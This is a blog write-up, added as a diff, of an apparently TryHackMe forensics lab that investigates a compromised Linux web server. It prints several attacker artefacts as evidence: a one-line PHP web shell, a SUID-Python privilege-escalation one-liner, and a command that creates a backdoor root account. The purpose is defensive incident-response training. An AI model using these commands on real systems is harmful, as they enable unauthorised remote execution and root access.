@@ -1,0 +1,546 @@
+---
+title: 'Linux Process Analysis '
+date: '2023-11-30'
+lastmod: '2023-11-30'
+tags: ['THM', 'exploit', 'cybersecurity']
+summary: "Perform real-time file system analysis on a Linux system to identify an attacker's artefacts."
+thumbnail: '/static/images/linuxfsa-2023/banner.png'
+images: ['/static/images/linuxfsa-2023/banner.png']
+authors: ['psga']
+layout: PostSimple
+---
+change to 20 march 2024
+# Investigation Setup
+## Scenario
+
+To offer a hands-on approach to performing a live investigation, we have been tasked by Penguin Corp to perform file system and OS analysis on a Linux-based web server during a suspected breach. This investigation's urgency stems from identifying a potential file upload vulnerability within the web server, creating a path for remote attackers to execute arbitrary commands (remote code execution) and gain unauthorised access.
+By analysing the artefacts left over and reconstructing the timeline of events through file system analysis, we intend to provide Penguin Corp with a clear understanding of the extent and nature of the compromise.
+## Securing the Environment
+
+While we perform live forensic analysis on this system, it is important to note that in this assumed scenario, we have already acquired all necessary backups and have isolated the system from the network to prevent further compromise or tampering.
+As this is a potentially compromised host, it is a good idea to ensure we are using known good binaries and libraries to conduct our information gathering and analysis. Often, this can be done by mounting a USB or drive containing binaries from a clean Debian-based installation. This has been simulated on the attached VM by copying the /bin, /sbin, /lib, and /lib64 folders from a clean installation into the /mnt/usb mount on the affected system.
+**Note:** The following steps should be performed after establishing an SSH connection to the target machine, not on the AttackBox.
+
+This effort aims to mitigate the risk of inadvertently executing malicious code or compromised utilities on systems. Suppose an attacker gains privileged access to a system. In that case, they may replace or alter existing utilities with malicious binaries or libraries that could cause further harm when run by an unsuspecting investigator. By using a trusted source, it enhances the reliability and integrity of our investigation.
+
+We can modify our ``PATH`` and ``LD_LIBRARY_PATH`` (shared libraries) environment variables to use these trusted binaries:
+
+---
+
+```
+investigator@10.10.45.10:~$ export PATH=/mnt/usb/bin:/mnt/usb/sbin
+investigator@10.10.45.10:~$ export LD_LIBRARY_PATH=/mnt/usb/lib:/mnt/usb/lib64
+```
+
+The `export PATH=/mnt/usb/bin:/mnt/usb/sbin` command modifies the `PATH` environment variable. The "export" command is used to set environment variables in the shell. The `PATH` variable tells the shell where to look for executable files. When you type a command, the shell searches the directories listed in `PATH` to find the executable file. By placing `/mnt/usb/bin` and `/mnt/usb/sbin` at the beginning of the `PATH` variable, you ensure that the shell will search these directories first before searching the default system directories.
+
+The command `export LD_LIBRARY_PATH=/mnt/usb/lib:/mnt/usb/lib64` modifies the `LD_LIBRARY_PATH` environment variable. The `export` command is again used to set environment variables in the shell. The `LD_LIBRARY_PATH` variable specifies the directories where the system should search dynamically before searching the default library directories. Dynamic libraries are files that executable programs depend on to run. By setting `LD_LIBRARY_PATH` to `/mnt/usb/lib` and `/mnt/usb/lib64`, you ensure that any shared libraries needed by the executables will be loaded from these trusted locations.
+
+The purpose of these commands is to improve the security and reliability of forensic investigation by using trusted libraries and binaries. By using binaries and libraries from a trusted source (the USB drive), you mitigate the risk of executing malicious or potentially compromised code that may reside in the system's default directories. Ensuring that the tools and libraries you use are unaltered and come from a known good source means that the results of your forensic analysis will be accurate and reliable.
+
+After running these commands, when you run any command (e.g. `ls`, `ps`, `top`), the shell will first look for the executable in `/mnt/usb/bin` and `/mnt/usb/. sbin`. If it doesn't find the executable there, it will search the default system directories.
+
+Let's run ``check-env`` to get the flag
+
+# Files, Permissions,and Timestamps
+
+## Identifying the Foothold
+
+During our initial briefing with Penguin Corp, we learned that Penguin Corp's web server is susceptible to a file upload vulnerability, leading to an attacker gaining root access to the system. To start our investigation, we need to be able to explore the system's files effectively.
+
+To identify clues that the file upload feature was exploited, we should focus our search on the web directories and review the uploaded files on the server. First, navigate to the web directory at `/var/www/html/` and run `ls -al` to list out the web files and directories:
+
+```
+investigator@10.10.45.10:~$ ls -al /var/www/html/
+total 32
+drwxr-xr-x 4 root     root      4096 Feb 12 23:05 .
+drwxr-xr-x 3 root     root      4096 Feb 12 16:25 ..
+drwxr-xr-x 2 www-data www-data  4096 Feb 13 00:32 assets
+-rw-r--r-- 1 root     root     10918 Feb 12 16:25 index.html
+-rwxr-xr-x 1 www-data www-data   905 Feb 12 16:33 upload.php
+drwxr-xr-x 2 www-data www-data  4096 Feb 13 00:31 uploads
+```
+lets see the upload dir 
+```
+ls -al /var/www/html/uploads
+total 224
+drwxr-xr-x 2 www-data www-data 4096 Feb 13 00:31 .
+drwxr-xr-x 4 root     root     4096 Feb 12 23:05 ..
+-rw-r--r-- 1 www-data www-data 1908 Feb 12 16:59 ABHz3aj.jpeg
+-rw-r--r-- 1 www-data www-data 1908 Feb 12 16:59 AhVpDoS.jpeg
+-rw-r--r-- 1 www-data www-data 1908 Feb 12 17:00 AqLnBvC.jpeg
+-rw-r--r-- 1 www-data www-data 1908 Feb 12 17:00 AsDfGhJ.jpeg
+-rw-r--r-- 1 www-data www-data 1908 Feb 12 17:00 AzSxWqE.jpeg
+-rw-r--r-- 1 www-data www-data 1908 Feb 12 17:00 BcFvGtR.jpeg
+-rw-r--r-- 1 www-data www-data 1908 Feb 12 17:00 BcNmLoP.jpeg
+-rw-r--r-- 1 www-data www-data 1908 Feb 12 16:59 CoSaBmQ.jpeg
+...
+```
+
+Upon examination of the /uploads directory, it is evident that many files with seemingly random names, including JPEG images, are present. Additionally, note that these files are all owned by the www-data user. To focus on potential non-image files, we can use the grep command to filter out JPEG files:
+
+lets see the files no jpeg with grep.
+```
+investigator@10.10.45.10:~$ ls -al /var/www/html/uploads | grep -v ".jpeg"
+total 224
+drwxr-xr-x 2 www-data www-data 4096 Feb 13 00:31 .
+drwxr-xr-x 4 root     root     4096 Feb 12 23:05 ..
+-rw-r--r-- 1 www-data www-data   30 Feb 13 00:31 b2c8e1f5.phtml
+
+```
+
+Viewing the contents of this interesting ``.phtml`` file suggests evidence of a malicious web shell (a file on a web server that allows system command execution), confirming our assumptions:
+
+```
+investigator@10.10.45.10:~$ cat /var/www/html/uploads/b2c8e1f5.phtml 
+<?php system($_GET['cmd']);?>
+```
+
+From the above analysis, it appears the attacker uploaded a .phtml document to execute PHP code on the server. Due to the unsafe system() call in the PHP code, this file allows the execution of arbitrary commands on the system remotely. The attacker likely exploited this to establish a more stable connection from the web server to their system.
+
+## Ownership and Permissions
+It's a good idea to run the ls -al command to list files in these directories and investigate any suspicious files or changes. We can also leverage the find command to quickly identify files that match our criteria.
+Since the user www-data was the one who inserted the malicious file, we are going to filter to find it
+```
+find / -user www-data -type f 2>/dev/null | less
+/var/www/html/assets/reverse.elf
+/var/www/html/uploads/MzCxVeR.jpeg
+/var/www/html/uploads/AzSxWqE.jpeg
+/var/www/html/uploads/QaWsEdR.jpeg
+/var/www/html/uploads/TyHjKlM.jpeg
+...
+```
+
+In the output of the command, we notice several benign entries. However, one that sticks out is reverse.elf listed in the /var/www/html/assets/ directory. By listing out the file in more detail (ls -l /var/www/html/assets/reverse.elf), we can see that the file permissions indicate that this file is executable by all users as characterised by the x bit:
+```
+investigator@10.10.45.10:~$ ls -l /var/www/html/assets/reverse.elf 
+-rwxr-xr-x 1 www-data www-data 250 Feb 13 00:26 /var/www/html/assets/reverse.elf
+```
+
+## Metadata, Analysis of Checksums and Timestamp
+let see the metadata using `exiftool`
+```
+investigator@10.10.45.10:~$ exiftool /var/www/html/assets/reverse.elf 
+ExifTool Version Number         : 11.88
+File Name                       : reverse.elf
+Directory                       : /var/www/html/assets
+File Size                       : 250 bytes
+File Modification Date/Time     : 2024:02:13 00:26:28+00:00
+File Access Date/Time           : 2024:02:13 02:31:29+00:00
+File Inode Change Date/Time     : 2024:02:13 00:34:50+00:00
+File Permissions                : rwxr-xr-x
+File Type                       : ELF executable
+File Type Extension             : 
+MIME Type                       : ***********/*****-******
+CPU Architecture                : 64 bit
+CPU Byte Order                  : Little endian
+Object File Type                : Executable file
+CPU Type                        : AMD x86-64
+
+```
+
+We can leverage two useful checksum utilities to inspect the hashes of the reverse.elf file we identified previously. We can run both md5sum and sha256sum on the file to output its hash:
+
+```
+investigator@10.10.45.10:~$ md5sum /var/www/html/assets/reverse.elf 
+c6cbdba1c147fbb7239284b7df2aa653  /var/www/html/assets/reverse.elf
+investigator@10.10.45.10:~$ sha256sum /var/www/html/assets/reverse.elf 
+ee0ea8d8bc205c4e2e2cc9ff7ddb71dee22ac0a50c2042701d49e565e0821410  /var/www/html/assets/reverse.elf
+```
+Once we have obtained the hash values, we can submit them to a malware detection service like VirusTotal for further analysis. Upon doing so, we will find evidence of various vendors flagging this file as a Meterpreter reverse shell payload. This quick analysis suggests that the attacker placed and executed the reverse.elf file using their initial RCE to achieve an interactive reverse shell connection to the web server.
+
+
+```
+investigator@10.10.45.10:~$ stat /var/www/html/assets/reverse.elf 
+  File: /var/www/html/assets/reverse.elf
+  Size: 250       	Blocks: 8          IO Block: 4096   regular file
+Device: ca01h/51713d	Inode: 526643      Links: 1
+Access: (0755/-rwxr-xr-x)  Uid: (   33/www-data)   Gid: (   33/www-data)
+Access: 2024-02-13 02:31:29.256000000 +0000
+Modify: 2024-02-13 00:26:28.000000000 +0000
+Change: 2024-02-13 00:34:50.679215113 +0000
+ Birth: -
+```
+
+## The Flags
+
+- **To practice your skills with the find command, locate all the files that the user bob created in the past 1 minute. Once found, review its contents. What is the flag you receive?**
+
+    We can use 
+    ```
+    find / -type f -user bob -cmin -1 2>/dev/null	
+    ```
+    Retrieve a list of files created or changed by the user bob within the last minute,
+
+- **Extract the metadata from the reverse.elf file. What is the file's MIME type?**
+    We can see the metadata using ExifTool
+    ```
+    investigator@ip-10-10-45-10:~$ exiftool /var/www/html/assets/reverse.elf 
+    ExifTool Version Number         : 11.88
+    File Name                       : reverse.elf
+    Directory                       : /var/www/html/assets
+    File Size                       : 250 bytes
+    File Modification Date/Time     : 2024:02:13 00:26:28+00:00
+    File Access Date/Time           : 2024:06:15 22:07:19+00:00
+    File Inode Change Date/Time     : 2024:02:13 00:34:50+00:00
+    File Permissions                : rwxr-xr-x
+    File Type                       : ELF executable
+    File Type Extension             : 
+    MIME Type                       : application/octet-stream
+    CPU Architecture                : 64 bit
+    CPU Byte Order                  : Little endian
+    Object File Type                : Executable file
+    CPU Type                        : AMD x86-64
+    ```
+    it show MIME Type
+- **Run the stat command against the /etc/hosts file on the compromised web server. What is the full Modify Timestamp (mtime) value?**
+    ```
+    investigator@ip-10-10-45-10:~$ stat /etc/hosts
+    File: /etc/hosts
+    Size: 221       	Blocks: 8          IO Block: 4096   regular file
+    Device: ca01h/51713d	Inode: 49          Links: 1
+    Access: (0644/-rw-r--r--)  Uid: (    0/    root)   Gid: (    0/    root)
+    Access: 2024-06-15 20:53:22.860000000 +0000
+    Modify: 2020-10-26 21:10:44.000000000 +0000
+    Change: 2020-10-26 23:32:25.957900650 +0000
+    Birth: -
+    ```
+# Users and Groups 
+
+As we continue our investigation, we should focus on the system's users and groups. In doing so, we may uncover evidence of the attacker moving laterally or maintaining access throughout the system by exploiting additional vulnerabilities.
+
+## Identifying User Accounts
+
+Let's view the user accounts on the affected system by reading the file:
+
+
+```
+investigator@10.10.45.10:~$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+...
+```
+We already have the passwd so the next thing would be to search for all the accounts with UID "0" And we can do this with this command.
+
+``` 
+investigator@ip-10-10-45-10:~$ cat /etc/passwd | cut -d: -f1,3 | grep ':0$'
+root:0
+b4ckd00r3d:0
+```
+Here we see two users, root and a backdoor user.
+This, however, is not a foolproof method, as the backdoor account could have been created with legitimate user and group IDs. For further investigation, we can take a look at groups.
+
+## Group identification
+In Linux systems, certain groups grant specific privileges that attackers may target to escalate their privileges. Some important Linux groups that might be of interest to an attacker include:
+
+- *sudo or wheel* : Members of the sudo (or wheel) group have the authority to execute commands with elevated privileges using sudo.
+- *adm* : The adm group typically has read access to system log files.
+- *shadow* : The shadow group is related to managing user authentication and password information. With this membership, a user can read the /etc/shadow file, which contains the password hashes of all users on the system.
+- *disk* : Members of the disk group have almost unrestricted read and limited write access inside the system.
+
+
+We can view all of the groups (and their respective group IDs) on the system by reading the /etc/group file:
+
+```
+investigator@10.10.45.10:~$ cat /etc/group
+root:x:0:
+daemon:x:1:
+bin:x:2:
+sys:x:3:
+adm:x:4:syslog,ubuntu,investigator
+...
+```
+To determine which groups a specific user is a member of, we can run the following command:
+``` 
+investigator@10.10.45.10:~$ groups investigator
+investigator : investigator adm dialout cdrom floppy sudo audio dip video plugdev netdev lxd
+```
+Alternatively, to list all of the members of a specific group, we can run the following command:
+
+```
+investigator@10.10.45.10:~$ getent group adm
+adm:x:4:syslog,ubuntu,investigator
+```
+If multiple users are in a group (as seen above), their usernames will be listed in a comma-separated format in the entry.
+To list all users in the sudo group, we can provide either the name "sudo" or the group ID, typically 27.
+
+```
+investigator@10.10.45.10:~$ getent group 27
+sudo:x:27:ubuntu,investigator
+```
+## User Logins and Activity
+
+**last and last**
+
+The last command is an excellent tool for examining user logins and sessions. It is used to display the history of the last logged-in users. It works by reading the /var/log/wtmp file, which is a file that contains every login and logout activity on the system. Similarly, lastb specifically tracks failed login attempts by reading the contents of /var/log/btmp, which can help identify login and password attacks.
+
+**lastlog**
+
+Unlike the last command, which provides information about all user logins, the lastlog command focuses on a user's most recent login activity and reads from the /var/log/lastlog file.
+
+**Failed Login Attempts**
+
+In addition to lastb, there are other ways to view failed login attempts on Linux through specific log files. The /var/log/auth.log file (or /var/log/secure on some distributions like CentOS or Red Hat) contains records of authentication-related events, including both successful and failed login attempts.
+
+**who**
+
+The who command is a very straightforward command that can be used to display the users that are currently logged into the system. The output of this command can provide details such as the name of the user logged in, the terminal device used, the time that the session was established, idle activity, the process ID of the shell, and additional comments that may include details such as the initial command used to start the session.
+
+
+## Sudo
+
+The /etc/sudoers file is a particularly sensitive configuration file within Unix-like systems. It determines which users possess sudo privileges, enabling them to execute commands as other users, typically the root user.
+
+## The Flags
+- **Investigate the user accounts on the system. What is the name of the backdoor account that the attacker created?**
+    We can see this using passwd which is where all the users are located and there we can see where the backdoor user, above is the code with the solution
+- **What is the name of the group with the group ID of 46?**
+    With this command we can see the groups according to their ID number
+    ```
+    investigator@ip-10-10-45-10:~$ getent group 46
+    ******:x:46:ubuntu,investigator
+    ```
+- **View the file on the compromised system. What is the full path of the binary that Jane can run as sudo?/etc/sudoer**
+
+    Is to see the "sudoers" file
+    ```
+    investigator@ip-10-10-45-10:~$ sudo cat /etc/sudoers
+    ```
+    At the end the binary that Jane executes as sudoers is shown
+
+    ```
+    jane ALL=(ALL) /usr/bin/pstree
+    ```
+
+# User Directories and Files
+
+## User Home Directories
+
+We can list out the home directories with a simple ls -l command:
+```
+investigator@MACHINE_IP:~$ ls -l /home
+total 16
+drwxr-xr-x 4 bob          bob          4096 Feb 12 19:32 bob
+drwxr-xr-x 3 investigator investigator 4096 Feb 13 02:22 investigator
+drwxr-xr-x 4 jane         jane         4096 Feb 13 00:36 jane
+drwxr-xr-x 5 ubuntu       ubuntu       4096 Feb 12 21:23 ubuntu
+```
+## Hidden Files
+
+To list out the hidden files within Jane's home directory, run:
+
+```
+investigator@MACHINE_IP:~$ ls -a /home/jane
+.  ..  .bash_history  .bash_logout  .bashrc  .cache  .profile  .ssh
+```
+Additionally, we can look at other files and directories of interest, like browser profiles and the .ssh directory.
+
+## SSH and Backdoors
+
+First, navigate to the .ssh directory within Jane's home folder. From here, we can run an ls -al to list the contained files:
+```
+investigator@MACHINE_IP:~$ ls -al /home/jane/.ssh
+total 20
+drwxr-xr-x 2 jane jane 4096 Feb 12 17:15 .
+drwxr-xr-x 4 jane jane 4096 Feb 13 00:36 ..
+-rw-rw-rw- 1 jane jane 1136 Feb 13 00:34 authorized_keys
+-rw------- 1 jane jane 3389 Feb 12 17:12 id_rsa
+-rw-r--r-- 1 jane jane  746 Feb 12 17:12 id_rsa.pub
+```
+## The Flags
+
+- **View Jane's .bash_history file. What flag do you see in the output?**
+    
+    First we go home
+    
+    ```
+    investigator@ip-10-10-87-233:~$ cd /home
+    investigator@ip-10-10-87-233:/home$
+    ```
+    From home we execute sudo cat and we will see bsh history
+    
+    ```
+    investigator@ip-10-10-87-233:/home$ sudo cat jane/.bash_history
+    whoami
+    groups
+    CD ~
+    ls -al
+    find / -perm -u=s -type f 2>/dev/null
+    /usr/bin/python3.8 -c 'import os; os.execl("/bin/sh", "sh", "-p", "-c", "cp /bin/bash /var/tmp/bash && chown root:root /var/tmp/bash && chmod +s /var/tmp/bash")'
+    ls -al /var/tmp
+    exit
+    useradd -o -u 0 b4ckd00r3d
+    exit
+    **FLAG**
+    ```
+
+- **What is the hidden flag in Bob's home directory?**
+    
+    As we are at home we enter Bob
+    ```
+    investigator@ip-10-10-87-233:/home$ cd bob/
+    ```
+    we see what is inside your directory
+    
+    ```
+    investigator@ip-10-10-87-233:/home/bob$ ls -la
+    ```
+    We can see that there are many .hidden files. we can search for THM{} within these files.
+    
+    ```
+    investigator@ip-10-10-87-233:/home/bob$ cat .hidden* | grep THM
+    THM{*********}
+    ```
+
+- **Run the stat command on Jane's authorized_keys file. What is the full timestamp of the most recent modification?**
+    
+    Desde el home
+    ```
+    investigator@ip-10-10-87-233:/home$ stat jane/.ssh/authorized_keys
+    File: jane/.ssh/authorized_keys
+    Size: 1136            Blocks: 8          IO Block: 4096   regular file
+    Device: ca01h/51713d    Inode: 257561      Links: 1
+    Access: (0666/-rw-rw-rw-)  Uid: ( 1002/    jane)   Gid: ( 1002/    jane)
+    Access: 2024-02-13 00:34:53.692530853 +0000
+    Modify: 2024-02-13 00:34:16.005897449 +0000
+    Change: 2024-02-13 00:34:16.005897449 +0000
+    Birth: -
+    ```
+
+# Binaries and Executables
+
+Another area to look at within our compromised host's file system is identifying binaries and executables that the attacker may have created, altered, or exploited through permission misconfigurations.
+
+## Identifying Suspicious Binaries
+
+We can use the find command on UNIX-based systems to discover all executable files within the filesystem quickly:
+```
+investigator@MACHINE_IP:~$ find / -type f -executable 2> /dev/null
+/snap/core/16574/etc/init.d/single
+/snap/core/16574/etc/init.d/ssh
+/snap/core/16574/etc/init.d/ubuntu-fan
+/snap/core/16574/etc/init
+```
+
+## Binary Permissions
+
+SetUID (SUID) and SetGID (SGID) are special permission bits in Unix operating systems. These permission bits change the behaviour of executable files, allowing them to run with the privileges of the file owner or group rather than the privileges of the user who executes the file.
+
+
+Identifying SetUID (SUID) binaries on a Linux system involves examining the file permissions and explicitly looking for executables with the SetUID bit set. We can return to the find command to retrieve a list of the SetUID binaries on the system:
+
+```
+investigator@MACHINE_IP:~$ find / -perm -u=s -type f 2>/dev/null
+...
+/usr/bin/fusermount
+/usr/bin/python3.8
+/usr/bin/at
+/usr/bin/mount
+/var/tmp/bash
+/mnt/usb/lib/dbus-1.0/dbus-daemon-launch-helper
+...
+```
+
+We can investigate further by looking in Jane's bash history for any commands related to Python or bash:
+
+```
+investigator@MACHINE_IP:~$ sudo cat /home/jane/.bash_history | grep -B 2 -A 2 "python"
+ls -al
+find / -perm -u=s -type f 2>/dev/null
+/usr/bin/python3.8 -c 'import os; os.execl("/bin/sh", "sh", "-p", "-c", "cp /bin/bash /var/tmp/bash && chown root:root /var/tmp/bash && chmod +s /var/tmp/bash")'
+ls -al /var/tmp
+/var/tmp/bash -p
+exit
+```
+From the output, we've discovered evidence of Jane's user account identifying SUID binaries with the find command and abusing the SUID permission on the Python binary to run system commands as the root user. With this level of command execution, the attacker was able to create a copy of the /bin/bash binary (the Bash shell executable) and place it into the /var/tmp folder. Additionally, the attacker changed the owner of this file to root and added the SUID permission to it (chmod +s).
+
+## The Flags
+
+- **Run the debsums utility on the compromised host to check only configuration files. Which file came back as altered?**
+    
+    We can use debsum to see the integrity of the packages and see the file that was altered.
+
+    ```
+    sudo debsums -e -s
+    debsums: changed file /***/******(from sudo package)
+    ```
+- **What is the md5sum of the binary that the attacker created to escalate privileges to root?**
+    
+    Use md5 sum to see the hash of the binary and we can compare it
+    ```
+    investigator@ip-10-10-87-233:/home$ md5sum /bin/bash
+    23c415748ff840b296d0b93f98649dec /bin/bash
+    investigator@ip-10-10-87-233:/home$ md5sum /var/tmp/bash
+    7063c3930affe123baecd3b340f1ad2c /var/tmp/bash
+    ```
+
+# Rootkits
+
+Rootkits are particularly dangerous because they can hide their presence on a system and allow attackers to maintain long-term access without detection. Attackers can also use them to stage other malicious activities on the target, exfiltrate sensitive information, or command and control the compromised system remotely.
+
+Fortunately, we can use some automated tools on UNIX-based systems to help detect and remove rootkits.
+
+## Chkrootkit
+
+Chkrootkit (Check Rootkit) is a popular Unix-based utility used to examine the filesystem for rootkits. It operates as a simple shell script, leveraging common Linux binaries like grep and strings to scan the core system programs to identify signatures. It can use the signatures from files, directories, and processes to compare the data and identify common patterns of known rootkits. As it does not perform an in-depth analysis, it is an excellent tool for a first-pass check to identify potential compromise, but it may not catch all types of rootkits.
+
+We can access the chkrootkit on the compromised system using our mounted binaries. We can perform a simple check by running chkrootkit:
+```
+Chkrootkit Example
+investigator@MACHINE_IP:~$ sudo chkrootkit
+ROOTDIR is `/'
+Checking `amd'...                                           not found
+Checking `basename'...                                      not infected
+Checking `biff'...                                          not found
+Checking `chfn'...                                          not infected
+Checking `chsh'...                                          not infected
+Checking `cron'...                                          not infected
+Checking `crontab'...                                       not infected
+Checking `date'...                                          not infected
+...
+```
+
+## RKHunter
+
+RKHunter (Rootkit Hunter) is another helpful tool designed to detect and remove rootkits on Unix-like operating systems. It offers a more comprehensive and feature-rich rootkit detection check compared to chkrootkit. RKHunter can compare SHA-1 hashes of core system files with known good ones in its database to search for common rootkit locations, wrong permissions, hidden files, and suspicious strings in kernel modules. It is an excellent choice for a more comprehensive assessment of the affected system.
+
+To perform a simple scan with rkhunter, we can run the following command:
+```
+investigator@MACHINE_IP:~$ sudo rkhunter -c -sk
+[ Rootkit Hunter version 1.4.6 ]
+
+Checking system commands...
+
+  Performing 'strings' command checks
+    Checking 'strings' command                               [ OK ]
+
+  Performing 'shared libraries' checks
+    Checking for preloading variables                        [ None found ]
+...
+```
+## The Flags
+- **Run chkrootkit on the affected system. What is the full path of the .sh file that was detected?**
+    
+    If we run sudo chrootkit we can see
+    ```
+    Searching for Mumblehard Linux ... * * * * * /var/tmp/findme.sh
+    ```
+    Which means that a mumblehard type .sh file was found
+- **Run rkhunter on the affected system. What is the result of the (UID 0) accounts check?**
+    
+    Before using rkhunter we must update.
+    Because rkhunter leverages a live database of known rootkit signatures, checking for database updates (rkhunter --update) before running in the field is crucial. Because this system is isolated, we won't be able to run a database update here, but the latest version was acquired before mounting our tools to the system.
+
+    ```
+    investigator@ip-10-10-87-233:/home$ sudo rkhunter --update
+    ```
+    and then
+    ```
+    investigator@10.10.87.233:~$ sudo rkhunter -c -sk
+    ```
+    we can see that /usr/bin/su comes out as warning. Therefore
+    ```
+    Checking for root equivalent (UID 0) accounts            [ Warning ]
+    ```
